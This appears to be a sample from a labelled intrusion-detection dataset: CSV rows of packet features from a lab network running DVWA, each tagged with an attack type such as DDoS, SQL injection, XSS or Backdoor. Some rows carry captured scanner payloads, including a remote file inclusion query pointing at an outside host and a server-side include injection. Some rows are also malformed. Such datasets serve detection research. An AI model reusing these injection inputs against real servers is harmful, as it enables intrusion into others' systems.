frame.time,ip.src_host,ip.dst_host,arp.dst.proto_ipv4,arp.opcode,arp.hw.size,arp.src.proto_ipv4,icmp.checksum,icmp.seq_le,icmp.transmit_timestamp,http.file_data,http.content_length,http.request.uri.query,http.request.method,http.referer,http.request.full_uri,http.request.version,http.response,tcp.ack,tcp.ack_raw,tcp.checksum,tcp.connection.fin,tcp.connection.rst,tcp.connection.syn,tcp.connection.synack,tcp.dstport,tcp.flags,tcp.flags.ack,tcp.len,tcp.options,tcp.payload,tcp.seq,tcp.srcport,udp.port,udp.stream,udp.time_delta,dns.qry.name,dns.qry.name.len,dns.qry.qu,mqtt.conack.flags,mqtt.conflag.cleansess,mqtt.conflags,mqtt.hdrflags,mqtt.len,mqtt.msg,mqtt.msgtype,mqtt.proto_len,mqtt.protoname,mqtt.topic,mqtt.topic_len,mqtt.ver,Attack_label,Attack_type
0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5353.0,5353.0,5.0,4.1e-05,_googlecast._tcp.local,22.0,0.0,12.0,1.0,1.0,732.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,MITM
 2021 19:35:45.032917000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,dump_sql=foo,12.0,0,GET,0,http://192.168.0.128/DVWA/servlet/SnoopServlet,HTTP/1.1,0.0,7439.0,3709409818.0,28693.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,239.0,0101080a3fc058eb49418521,474554202f445657412f736572766c65742f536e6f6f70536572766c657420485454502f312e310d0a436f6e74656e742d4c656e6774683a2031320d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a557365722d4167656e743a204d6f7a696c6c612f352e303020284e696b746f2f322e312e3629202845766173696f6e733a4e6f6e65292028546573743a303033333838290d0a486f73743a203139322e3136382e302e3132380d0a0d0a64756d705f73716c3d666f6f,4105.0,49942.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Vulnerability_scanner
 2021 23:21:04.952522000 ,78.9.70.242,192.168.0.128,0,0.0,0.0,0,42464.0,6155.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 18:30:57.676145000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,"<!DOCTYPE html>\r\n\r\n<html lang=""en-GB"">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=""stylesheet"" type=""text/css"" href=""dvwa/css/login.css"" />\r\n\r\n\t</head>\r\n\r\n\t<body>\r\n\r\n\t<div id=""wrapper"">\r\n\r\n\t<div id=""header"">\r\n\r\n\t<br />\r\n\r\n\t<p><img src=""dvwa/images/login_logo.png"" /></p>\r\n\r\n\t<br />\r\n\r\n\t</div> <!--<div id=""header"">-->\r\n\r\n\t<div id=""content"">\r\n\r\n\t<form action=""login.php"" method=""post"">\r\n\r\n\t<fieldset>\r\n\r\n\t\t\t<label for=""user"">Username</label> <input type=""text"" class=""loginInput"" size=""20"" name=""username""><br />\r\n\r\n\r\n\t\t\t<label for=""pass"">Password</label> <input type=""password"" class=""loginInput"" AUTOCOMPLETE=""off"" size=""20"" name=""password""><br />\r\n\r\n\t\t\t<br />\r\n\r\n\t\t\t<p class=""submit""><input type=""submit"" value=""Login"" name=""Login""></p>\r\n\r\n\t</fieldset>\r\n\r\n\t<input type='hidden' name='user_token' value='3e53c381420b685e9547421fc53668ca' />\r\n\r\n\t</form>\r\n\r\n\t<br />\r\n\r\n\t\r\n\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\r\n\t<!-- <img src=""dvwa/images/RandomStorm.png"" /> -->\r\n\t</div > <!--<div id=""content"">-->\r\n\r\n\t<div id=""footer"">\r\n\r\n\t<p><a href=""https://github.com/digininja/DVWA/"" target=""_blank"">Damn Vulnerable Web Application (DVWA)</a></p>\r\n\r\n\t</div> <!--<div id=""footer""> -->\r\n\r\n\t</div> <!--<div id=""wrapper""> -->\r\n\r\n\t</body>\r\n\r\n</html>",1415.0,0.0,0,0.0,0,0,1.0,87.0,520406926.0,37934.0,0.0,0.0,0.0,0.0,55394.0,24.0,1.0,429.0,0101080a7b28d292e7b3e205,3e0d0a0d0a093c2f666f726d3e0d0a0d0a093c6272202f3e0d0a0d0a090d0a0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a0d0a093c212d2d203c696d67207372633d22647677612f696d616765732f52616e646f6d53746f726d2e706e6722202f3e202d2d3e0d0a093c2f646976203e203c212d2d3c6469762069643d22636f6e74656e74223e2d2d3e0d0a0d0a093c6469762069643d22666f6f746572223e0d0a0d0a093c703e3c6120687265663d2268747470733a2f2f6769746875622e636f6d2f646967696e696e6a612f445657412f22207461726765743d225f626c616e6b223e44616d6e2056756c6e657261626c6520576562204170706c69636174696f6e202844565741293c2f613e3c2f703e0d0a0d0a093c2f6469763e203c212d2d3c6469762069643d22666f6f746572223e202d2d3e0d0a0d0a093c2f6469763e203c212d2d3c6469762069643d2277726170706572223e202d2d3e0d0a0d0a093c2f626f64793e0d0a0d0a3c2f68746d6c3e,1449.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Password
 2021 20:40:14.376246000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1230929.0,2693286186.0,54521.0,0.0,0.0,0.0,0.0,60210.0,16.0,1.0,0.0,0101080a3ded2f9f2b831ec5,0,1.0,4321.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Backdoor
 2021 19:35:12.149216000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,1.0,2070297914.0,2926.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a9ab0710b9e3e03eb,0,1.0,60972.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 22:19:59.846970000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,48379.0,0.0,0.0,1.0,0.0,65535.0,2.0,0.0,0.0,0.0,0.0,0.0,20573.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Fingerprinting
 2021 22:21:08.232343000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1297745668.0,48187.0,0.0,1.0,0.0,0.0,7356.0,20.0,1.0,0.0,0.0,0.0,1.0,65535.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Fingerprinting
 2021 19:05:45.631040000 ,0,0,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4218884.0,1143070791.0,42729.0,0.0,0.0,0.0,0.0,5900.0,16.0,1.0,0.0,0,0,18748.0,60944.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0,Normal
 2021 21:42:46.172318000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0,0,1.0,402.0,84854740.0,23847.0,0.0,0.0,0.0,0.0,44906.0,24.0,1.0,477.0,0101080a9eb2ce869b253b8f,485454502f312e312033303220466f756e640d0a446174653a204d6f6e2c203239204e6f7620323032312032303a34323a343620474d540d0a5365727665723a204170616368652f322e342e33382028526173706269616e290d0a5365742d436f6f6b69653a205048505345535349443d666a6a6d3637386d377064746e74683675367369367074676d723b20706174683d2f0d0a457870697265733a205468752c203139204e6f7620313938312030383a35323a303020474d540d0a43616368652d436f6e74726f6c3a206e6f2d73746f72652c206e6f2d63616368652c206d7573742d726576616c69646174650d0a507261676d613a206e6f2d63616368650d0a5365742d436f6f6b69653a205048505345535349443d666a6a6d3637386d377064746e74683675367369367074676d723b20706174683d2f3b20487474704f6e6c790d0a5365742d436f6f6b69653a2073656375726974793d696d706f737369626c653b20487474704f6e6c790d0a4c6f636174696f6e3a202e2e2f2e2e2f6c6f67696e2e7068700d0a436f6e74656e742d4c656e6774683a20300d0a436f6e6e656374696f6e3a20636c6f73650d0a436f6e74656e742d547970653a20746578742f68746d6c3b20636861727365743d5554462d380d0a0d0a,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,SQL_injection
 2021 19:23:44.443294000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,method=open+service%3a3%2e0%2e2%2e1105&service%5fname=%2f,57.0,path_prefix=http://cirt.net/rfiinc.txt?,GET,0,http://192.168.0.128/DVWA/web/BetaBlockModules/RecentTagsModule/RecentTagsModule.php?path_prefix=http://cirt.net/rfiinc.txt?,HTTP/1.1,0.0,13862.0,3952248616.0,35068.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,362.0,0101080a3fb558fb49368652,474554202f445657412f7765622f42657461426c6f636b4d6f64756c65732f526563656e74546167734d6f64756c652f526563656e74546167734d6f64756c652e7068703f706174685f7072656669783d687474703a2f2f636972742e6e65742f726669696e632e7478743f20485454502f312e310d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a557365722d4167656e743a204d6f7a696c6c612f352e303020284e696b746f2f322e312e3629202845766173696f6e733a4e6f6e65292028546573743a303036313234290d0a436f6e74656e742d4c656e6774683a2035370d0a486f73743a203139322e3136382e302e3132380d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a0d0a6d6574686f643d6f70656e2b736572766963652533613325326530253265322532653131303526736572766963652535666e616d653d253266,10283.0,48450.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Vulnerability_scanner
 2021 23:19:46.666112000 ,192.168.0.128,209.213.165.134,0,0.0,0.0,0,9990.0,62097.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 17:18:29.507917000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1215878430.0,63604.0,0.0,1.0,0.0,0.0,5882.0,20.0,1.0,0.0,0.0,0.0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Port_Scanning
 2021 01:53:18.312364000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,"<!DOCTYPE html>\r\n\r\n<html lang=""en-GB"">\r\n\r\n\t<head>\r\n\r\n\t\t<meta http-equiv=""Content-Type"" content=""text/html; charset=UTF-8"" />\r\n\r\n\t\t<title>Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=""stylesheet"" type=""text/css"" href=""dvwa/css/login.css"" />\r\n\r\n\t</head>\r\n\r\n\t<body>\r\n\r\n\t<div id=""wrapper"">\r\n\r\n\t<div id=""header"">\r\n\r\n\t<br />\r\n\r\n\t<p><img src=""dvwa/images/login_logo.png"" /></p>\r\n\r\n\t<br />\r\n\r\n\t</div> <!--<div id=""header"">-->\r\n\r\n\t<div id=""content"">\r\n\r\n\t<form action=""login.php"" method=""post"">\r\n\r\n\t<fieldset>\r\n\r\n\t\t\t<label for=""user"">Username</label> <input type=""text"" class=""loginInput"" size=""20"" name=""username""><br />\r\n\r\n\r\n\t\t\t<label for=""pass"">Password</label> <input type=""password"" class=""loginInput"" AUTOCOMPLETE=""off"" size=""20"" name=""password""><br />\r\n\r\n\t\t\t<br />\r\n\r\n\t\t\t<p class=""submit""><input type=""submit"" value=""Login"" name=""Login""></p>\r\n\r\n\t</fieldset>\r\n\r\n\t<input type='hidden' name='user_token' value='4613e0c763ea3ff7825b9addf63dc970' />\r\n\r\n\t</form>\r\n\r\n\t<br />\r\n\r\n\t\r\n\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\t<br />\r\n\r\n\t<!-- <img src=""dvwa/images/RandomStorm.png"" /> -->\r\n\t</div > <!--<div id=""content"">-->\r\n\r\n\t<div id=""footer"">\r\n\r\n\t<p><a href=""https://github.com/digininja/DVWA/"" target=""_blank"">Damn Vulnerable Web Application (DVWA)</a></p>\r\n\r\n\t</div> <!--<div id=""footer""> -->\r\n\r\n\t</div> <!--<div id=""wrapper""> -->\r\n\r\n\t</body>\r\n\r\n</html>",1415.0,0.0,0,0.0,0,0,1.0,87.0,645498883.0,20736.0,0.0,0.0,0.0,0.0,43878.0,24.0,1.0,429.0,0101080ad3a947419a911183,3e0d0a0d0a093c2f666f726d3e0d0a0d0a093c6272202f3e0d0a0d0a090d0a0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a093c6272202f3e0d0a0d0a093c212d2d203c696d67207372633d22647677612f696d616765732f52616e646f6d53746f726d2e706e6722202f3e202d2d3e0d0a093c2f646976203e203c212d2d3c6469762069643d22636f6e74656e74223e2d2d3e0d0a0d0a093c6469762069643d22666f6f746572223e0d0a0d0a093c703e3c6120687265663d2268747470733a2f2f6769746875622e636f6d2f646967696e696e6a612f445657412f22207461726765743d225f626c616e6b223e44616d6e2056756c6e657261626c6520576562204170706c69636174696f6e202844565741293c2f613e3c2f703e0d0a0d0a093c2f6469763e203c212d2d3c6469762069643d22666f6f746572223e202d2d3e0d0a0d0a093c2f6469763e203c212d2d3c6469762069643d2277726170706572223e202d2d3e0d0a0d0a093c2f626f64793e0d0a0d0a3c2f68746d6c3e,1449.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Password
 2021 19:10:10.370362000 ,192.168.0.128,26.11.236.176,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,121.0,165387390.0,1604.0,0.0,1.0,0.0,0.0,15103.0,20.0,1.0,0.0,0.0,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_TCP
 2021 19:35:32.710112000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,"<!--#include virtual=""/index.jsp""-->",36.0,0,GET,0,http://192.168.0.128/DVWA/weblogs/,HTTP/1.1,0.0,8912.0,2772928853.0,6003.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,251.0,0101080a3fc028a9494154ff,474554202f445657412f7765626c6f67732f20485454502f312e310d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d4c656e6774683a2033360d0a557365722d4167656e743a204d6f7a696c6c612f352e303020284e696b746f2f322e312e3629202845766173696f6e733a4e6f6e65292028546573743a303031393235290d0a486f73743a203139322e3136382e302e3132380d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a0d0a3c212d2d23696e636c756465207669727475616c3d222f696e6465782e6a7370222d2d3e,4559.0,49806.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Vulnerability_scanner
 2021 19:03:11.249127000 ,192.27.173.187,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1552939896.0,1552939896.0,47591.0,0.0,0.0,1.0,0.0,80.0,2.0,0.0,120.0,0.0,585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858,0.0,43167.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_TCP
 2021 23:11:54.382257000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0,0,0.0,0.0,0.0,43420.0,0.0,0.0,1.0,0.0,3333.0,2.0,0.0,0.0,020405b40402080a4a0767ed0000000001030307,0,0.0,50068.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Uploading
 2021 11:37:58.924321000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,1022.0,3350006212.0,21215.0,0.0,0.0,0.0,0.0,33940.0,16.0,1.0,0.0,0101080a1dd726d90aa6c64c,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
 2021 11:36:52.987716000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,741.0,2675599547.0,23008.0,0.0,0.0,0.0,0.0,59450.0,16.0,1.0,0.0,0101080a1dd625490aa5c482,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
 2021 16:24:33.380563000 ,0,0,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Ransomware
 2021 17:51:43.586983000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,120.0,4129587096.0,17018.0,0.0,0.0,0.0,0.0,59124.0,16.0,1.0,0.0,0101080a9ddf47cc9a51b4df,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,XSS
 2021 19:22:18.051804000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0.0,0,0,0.0,1.0,3388135721.0,12089.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080ae7e2e31b7b57d51d,0,1.0,42112.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Password
160.9.123.134,192.168.0.128,0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,47010.0,0.0,2220065.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_UDP
 2021 23:16:46.784499000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0,0,0.0,0.0,0.0,23102.0,0.0,0.0,1.0,0.0,3333.0,2.0,0.0,0.0,020405b40402080a4a0bde1f0000000001030307,0,0.0,56386.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Uploading
 2021 21:36:41.710148000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0,0,0.0,0,0,0.0,1.0,2605205215.0,37388.0,0.0,0.0,0.0,1.0,38968.0,18.0,1.0,0.0,020405b40402080a9ead3ed89b1fabfb01030307,0,0.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,SQL_injection
 2021 20:19:34.634128000 ,192.168.0.101,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,598938500.0,2377.0,0.0,0.0,0.0,0.0,1883.0,16.0,1.0,0.0,0,0,59.0,50525.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0,Normal
 2021 20:00:16.937453000 ,192.168.0.101,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,1632693395.0,44822.0,0.0,0.0,0.0,0.0,1883.0,16.0,1.0,0.0,0,0,59.0,59303.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0,Normal
 2021 11:39:01.925065000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,806.0,3712499485.0,33453.0,0.0,0.0,0.0,0.0,44458.0,16.0,1.0,0.0,0101080a1dd81cf20aa7bc66,0,1.0,80.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
 2021 18:58:24.946319000 ,192.168.0.128,192.168.0.101,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,56.0,4011407837.0,48708.0,0.0,0.0,0.0,0.0,61791.0,16.0,1.0,0.0,0,0,5.0,1883.0,0.0,0.0,0.0,0.0,0.0,0.0,0,0.0,0.0,0.0,0.0,0,0.0,0.0,0,0,0.0,0.0,0,Normal
 2021 23:22:37.506127000 ,183.12.206.149,192.168.0.128,0,0.0,0.0,0,26074.0,7755.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_ICMP
 2021 22:26:47.720210000 ,192.168.0.128,192.168.0.170,0,0.0,0.0,0,20065.0,256.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Fingerprinting
 2021 11:37:46.942115000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0.0,0,0,0,0,0.0,1.0,2645108338.0,43819.0,0.0,0.0,0.0,0.0,80.0,24.0,1.0,41.0,0101080a0aa697661dd6ec5c,582d75486566694b324d584a6d717357343a20467667413141495a727a7174766971656e4b394c0d0a,875.0,33748.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_HTTP
 2021 22:24:55.820607000 ,0,0,192.168.0.170,2.0,6.0,192.168.0.128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Fingerprinting
 2021 19:38:27.591941000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0,0.0,0,0,0,0,0,0.0,472.0,3861033158.0,46155.0,0.0,0.0,0.0,0.0,80.0,16.0,1.0,0.0,0101080a3fc2d3f74944000c,0,919.0,50462.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Vulnerability_scanner
 2021 16:03:37.482593000 ,192.168.0.170,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,502746161.0,502746161.0,58518.0,0.0,0.0,1.0,0.0,80.0,2.0,0.0,0.0,0.0,0.0,0.0,1395.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,Port_Scanning
 2021 19:05:42.671367000 ,132.176.218.145,192.168.0.128,0,0.0,0.0,0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,143388109.0,143388109.0,14410.0,0.0,0.0,1.0,0.0,80.0,2.0,0.0,120.0,0.0,585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858585858,0.0,24277.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,DDoS_TCP
